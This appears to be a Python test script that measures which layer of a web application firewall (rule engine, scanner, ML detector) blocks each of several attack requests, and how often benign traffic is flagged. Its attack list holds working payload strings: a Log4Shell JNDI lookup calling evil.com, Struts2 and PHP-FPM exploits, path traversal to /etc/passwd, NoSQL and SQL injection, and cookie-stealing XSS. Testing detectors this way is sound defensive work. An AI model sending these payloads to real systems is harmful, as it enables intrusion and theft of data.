"""
Per-layer attribution: which layer catches each attack, and does the fixed ML
layer close the gaps the rule engine missed in the earlier run?
Also measures full 4-layer benign false-positive rate.
"""
import os, sys, json, time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.pattern_engine import pattern_engine
from core.comprehensive_scanner import comprehensive_scanner
from ml.detector_v2 import get_detector

ml = get_detector()

# The five the RULE layer missed in the first demo, + a few caught ones for contrast.
ATTACKS = [
    ("Log4Shell (CVE-2021-44228)", "GET", "/", "x=${jndi:ldap://evil.com/a}", ""),
    ("Struts2 (CVE-2018-11776)",  "GET", "/${(1+1)}/actionChain1.action", "", ""),
    ("PHP-FPM (CVE-2019-11043)",  "GET", "/index.php", "a=%0a", ""),
    ("Apache traversal (CVE-2021-41773)", "GET", "/cgi-bin/.%2e/%2e%2e/etc/passwd", "", ""),
    ("NoSQL injection",           "POST", "/api/login", "", '{"user":{"$gt":""},"pass":{"$gt":""}}'),
    ("SQLi UNION",                "GET", "/p", "id=1 UNION SELECT pass FROM users--", ""),
    ("Reflected XSS",             "GET", "/s", "q=<script>alert(document.cookie)</script>", ""),
]
BENIGN = [
    ("GET","/","",""),("GET","/search","q=wireless headphones under 100",""),
    ("POST","/login","",'{"username":"john.doe","password":"hunter2"}'),
    ("GET","/products","category=electronics&brand=apple&sort=price&page=2",""),
    ("GET","/articles/how-to-cook-pasta","ref=homepage&utm_source=newsletter",""),
    ("GET","/api/v2/users/48213","fields=name,email,avatar",""),
    ("POST","/cart/add","",'{"sku":"NB-1042","qty":2}'),
    ("GET","/transfer","to=jane.smith&amt=100&note=monthly+rent",""),
    ("GET","/health","",""),("GET","/faq","",""),
]

def rules_hit(p,q,b):
    return bool(pattern_engine.scan_request(p,q,b,{}))
def scanner_hit(p,q,b):
    res = comprehensive_scanner.scan_request(path=p,query=q,body=b,headers={})
    return any(r.severity.value/4.0 >= 0.5 for r in res)

rows=[]
print(f"{'attack':<38}{'rules':<8}{'scanner':<9}{'ML':<8}{'ML route':<12}{'zero-day'}")
for name,m,p,q,b in ATTACKS:
    r1=rules_hit(p,q,b); r2=scanner_hit(p,q,b)
    mr=ml.predict(m,p,q,b,{})
    rows.append({"name":name,"rules":r1,"scanner":r2,"ml":mr.is_malicious,
                 "ml_route":mr.route,"ml_prob":mr.mal_prob,"novelty":mr.novelty,
                 "zero_day":mr.is_zero_day,"category":mr.category})
    print(f"{name:<38}{('BLOCK' if r1 else '—'):<8}{('BLOCK' if r2 else '—'):<9}"
          f"{('BLOCK' if mr.is_malicious else '—'):<8}{mr.route:<12}{'YES' if mr.is_zero_day else ''}")

fp=0
for m,p,q,b in BENIGN:
    r1=rules_hit(p,q,b); r2=scanner_hit(p,q,b); mr=ml.predict(m,p,q,b,{})
    if r1 or r2 or mr.is_malicious: fp+=1
print(f"\nFull 4-layer benign false-positives: {fp}/{len(BENIGN)} = {fp/len(BENIGN)*100:.0f}%")

json.dump({"attribution":rows,"benign_fp":fp/len(BENIGN),"benign_n":len(BENIGN)},
          open(os.path.join(os.path.dirname(__file__),"ml_gap.json"),"w"), indent=2, default=float)
print("wrote demo/ml_gap.json")
